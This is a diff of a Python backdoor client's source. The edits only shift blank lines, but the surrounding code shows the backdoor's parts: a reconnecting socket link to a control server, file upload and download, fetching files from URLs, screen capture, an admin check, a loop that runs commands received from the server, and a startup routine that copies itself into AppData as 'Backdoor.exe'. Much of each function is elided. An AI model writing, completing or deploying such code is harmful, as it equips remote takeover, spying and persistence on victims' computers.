@@ -46,10 +46,9 @@ def connect_to_server():
             print(f'- Unable to connect to the server')
             connect_to_server()
 
+
 # RELIABLE SEND
 # -----------------------------------
-
-
 def send(data):
     # try:
     #     # data = data.encode()
@@ -76,10 +75,9 @@ def recv():
             print(e)
             break
 
+
 # SEND FILE
 # -----------------------------------
-
-
 def send_file(filename):
     # print("starting function")
     json_data = json.dumps(filename.decode())
@@ -87,10 +85,9 @@ def send_file(filename):
     client.send(json_data.encode())
     # print("sent data")
 
+
 # RECIEVE FILE
 # -----------------------------------
-
-
 def recv_file():
     # print("starting function")
     data = b""
@@ -107,28 +104,25 @@ def recv_file():
             print(e)
             break
 
+
 # DOWNLOAD FILES FROM INTERNET
 # -----------------------------------
-
-
 def download(url):
     get_response = requests.get(url)
     file_name = url.split("/")[-1]
     with open(file_name, "wb") as out_file:
         out_file.write(get_response.content)
 
+
 # TAKE SCREEN SHOT
 # -----------------------------------
-
-
 def screenshot():
     with mss() as screenshot:
         screenshot.shot()
 
+
 # CHECK ADMIN PRIVILIAGES
 # -----------------------------------
-
-
 def is_admin():
     global admin
     try:
@@ -139,10 +133,9 @@ def is_admin():
     else:
         admin = "Administrator Privilaes"
 
+
 # SHELL CLIENT
 # -----------------------------------
-
-
 def shell():
     while True:
         command = recv()
@@ -289,10 +282,9 @@ def shell():
             # print(result.decode())
             send(result.decode())
 
+
 # RUN AT STARTUP
 # -----------------------------------
-
-
 def run_at_startup():
     location = os.environ["appdata"] + "\\Backdoor.exe"
     if not os.path.exists(location):
